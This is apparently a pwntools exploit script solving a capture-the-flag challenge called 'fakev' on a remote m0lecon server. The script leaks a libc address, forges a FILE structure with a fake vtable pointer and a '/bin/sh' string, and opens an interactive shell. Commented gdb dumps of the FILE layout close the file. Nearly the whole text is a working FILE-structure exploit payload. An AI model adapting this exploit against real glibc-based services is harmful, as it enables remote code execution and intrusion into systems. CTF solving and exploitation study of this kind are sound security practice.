from pwn import *
context.log_level = "debug"

# p = process("./fakev")
# gdb.attach(p,'''
# 	break fclose
# 	''')

p = remote("challs.m0lecon.it",9013)

def choice(idx):
	p.sendlineafter("Choice: ",str(idx))

def open_(idx):
	choice(1)
	p.sendlineafter("Index: ",str(idx))

def close_():
	choice(4)

def read_(idx):
	choice(2)
	p.sendlineafter("Index: ",str(idx))
	data = p.recvline()
	return data

for i in xrange(1,9):
	open_(i)

for i in range(1,9):
	close_()

leak = read_(1)
libc = u64(leak[8:16])
print hex(libc)
libc_base = libc - 0x3ebca0
print hex(libc_base)

fake_vtable_addr = libc_base + 0x3e8360 + 0x8


for i in xrange(1,10):
	open_(i)

choice("4\x00\x00\x00\x00\x00\x00\x00" + p64(0x602110) + p64(0)*5 + p64(0x602190) + p64(0)*2 + p64((0x602190-100)/2) + "KKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQ/bin/sh\x00" + p64(0x602258) + "TTTTTTTTUUUUUUUU" + p64(0x6021b0) + p64(0x602108) + p64(0) + "YYYYYYYYZZZZZZZZ[[[[[[[[::::::::" + p64(fake_vtable_addr) + p64(libc_base + 0x4f440))
# choice()


p.interactive()


# 0x19a4a00:	0x00000000fbad2498	0x00000000019a4d50
# 0x19a4a10:	0x00000000019a4d50	0x00000000019a4d50
# 0x19a4a20:	0x00000000019a4d50	0x00000000019a4d50
# 0x19a4a30:	0x00000000019a4d50	0x00000000019a4d50
# 0x19a4a40:	0x00000000019a5d50	0x0000000000000000
# 0x19a4a50:	0x0000000000000000	0x0000000000000000
# 0x19a4a60:	0x0000000000000000	0x00000000019a36a0
# 0x19a4a70:	0x000000000000000a	0x0000000000000000
# 0x19a4a80:	0x0000000000000000	0x00000000019a4ae0
# 0x19a4a90:	0xffffffffffffffff	0x0000000000000000
# 0x19a4aa0:	0x00000000019a4af0	0x0000000000000000
# 0x19a4ab0:	0x0000000000000000	0x0000000000000000
# 0x19a4ac0:	0x00000000ffffffff	0x0000000000000000
# 0x19a4ad0:	0x0000000000000000	0x00007f07617ec2a0
